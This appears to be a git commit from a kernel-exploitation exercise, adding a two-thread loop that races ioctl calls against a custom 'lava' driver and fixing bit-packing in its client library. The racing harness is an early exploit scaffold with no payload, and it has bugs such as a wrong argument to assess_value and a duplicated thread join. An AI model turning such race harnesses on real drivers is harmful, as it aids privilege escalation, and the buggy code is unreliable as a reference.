b485f34034e16785ea7109da5f65d29fd8aa4c27
aftermathdigital <aftermath.digital0@gmail.com>
2023-02-18 23:00:29 +0000

    lmao, or != and

--- lavaclient.c
+++ lavaclient.c
@@ -1,15 +1,77 @@
 #include <stdio.h>
+#include <pthread.h>
 #include "lavalib.h"
 
+#define CRUCIBLE_ID 0
+
+int lava_fd = -1;
+
+void *thread_one_proc(void *_){
+    printf("[+] Thread one running...\n");
+    for(;;){
+        add_pebble(
+            lava_fd,
+            CRUCIBLE_ID,
+            0,
+            1,
+            1);
+        assess_value(
+            CRUCIBLE_ID,
+            0
+        );
+        remove_pebble(
+            lava_fd,
+            CRUCIBLE_ID,
+            0);
+    }
+    return NULL;
+}
+
+void *thread_two_proc(void *_){
+    printf("[+] Thread two running...\n");
+    for(;;){
+        add_pebble(
+            lava_fd,
+            CRUCIBLE_ID,
+            0,
+            1,
+            1);
+        assess_value(
+            CRUCIBLE_ID,
+            0
+        );
+        remove_pebble(
+            lava_fd,
+            CRUCIBLE_ID,
+            0);
+    }
+    return NULL;
+}
+
+
 int main(int argc, char *argv[]){
-    int lava_fd = -1;
+    long ret = -1;
+    pthread_t tids[2] = {-1,-1}; 
 
     lava_fd = get_handle();
-    
-    if(lava_fd < 0){
-        printf("[!] Invalid lava_fd handle!\n");
-        return -1;
-    }
+
+    //if(lava_fd < 0){
+    //    printf("[!] Invalid lava_fd handle!\n");
+    //    return -1;
+    //}
+
+    ret = new_crucible(
+        lava_fd,
+        CRUCIBLE_ID,
+        0xff,
+        0
+    );
+
+    ret = pthread_create(&(tids[0]), NULL, &thread_one_proc, NULL);
+    ret = pthread_create(&(tids[1]), NULL, &thread_two_proc, NULL);
+
+    pthread_join(tids[0], NULL);
+    pthread_join(tids[0], NULL);
 
     close_handle(lava_fd);
     
--- lavalib.c
+++ lavalib.c
@@ -20,39 +20,49 @@ void close_handle(int fd) {
 }
 
 long new_crucible(int fd, uint16_t id, uint8_t capacity, uint8_t valuer){
-    uint32_t input =    ((uint32_t)id << 16) &
-                        ((uint32_t)capacity << 8) &
+    uint32_t input =    ((uint32_t)id << 16) |
+                        ((uint32_t)capacity << 8) |
                         valuer;
 
     printf("[+] Creating new crucible\n\tid: %x capacity: %x valuer: %x\n", id, capacity, valuer);
-    return ioctl(fd, 0xa4a4a4a4, input);
+    long ret = ioctl(fd, 0xa4a4a4a4, input);
+    printf("[+] new_crucible returned %ld\n", ret);
+    return ret;
 }
 
 long add_pebble(int fd, uint16_t crucible_id, uint16_t pebble_id, uint16_t size, uint16_t lustre){
-    uint64_t input =    ((uint64_t)crucible_id << 48) &
-                        ((uint64_t)pebble_id << 32) &
-                        ((uint64_t)size << 16) &
+    uint64_t input =    ((uint64_t)crucible_id << 48) |
+                        ((uint64_t)pebble_id << 32) |
+                        ((uint64_t)size << 16) |
                         lustre;
 
     printf("[+] Adding pebble\n\tcrucible_id: %x pebble_id: %x size: %x lustre %x\n",
         crucible_id, pebble_id, size, lustre);
-    return ioctl(fd, 0xb6b6b6b6, input);
+    long ret = ioctl(fd, 0xb6b6b6b6, input);
+    printf("[+] add_pebble returned %ld\n", ret);
+    return ret;
 }
 
 long remove_pebble(int fd, uint16_t crucible_id, uint16_t pebble_id){
-    uint32_t input =    ((uint32_t)crucible_id << 16) &
+    uint32_t input =    ((uint32_t)crucible_id << 16) |
                         pebble_id;
     printf("[+] Removing pebble\n\tcrucible_id: %x pebble_id: %x\n",
         crucible_id, pebble_id);
-    return ioctl(fd, 0xc1c1c1c1, input);
+    long ret = ioctl(fd, 0xc1c1c1c1, input);
+    printf("[+] remove_pebble returned %ld\n", ret);
+    return ret;
 }
 
 long assess_value(int fd, uint16_t id){
     printf("[+] Assessing value\n\tid: %x\n", id);
-    return ioctl(fd, 0xd9d9d9d9, id);
+    long ret = ioctl(fd, 0xd9d9d9d9, id);
+    printf("[+] assess_value returned %ld\n", ret);
+    return ret;
 }
 
 long incinerate(int fd, uint16_t id){
     printf("[+] Incinerating\n\tid: %x\n", id);
-    return ioctl(fd, 0xe7e7e7e7, id);
+    long ret = ioctl(fd, 0xe7e7e7e7, id);
+    printf("[+] incinerate returned %ld\n", ret);
+    return ret;
 }
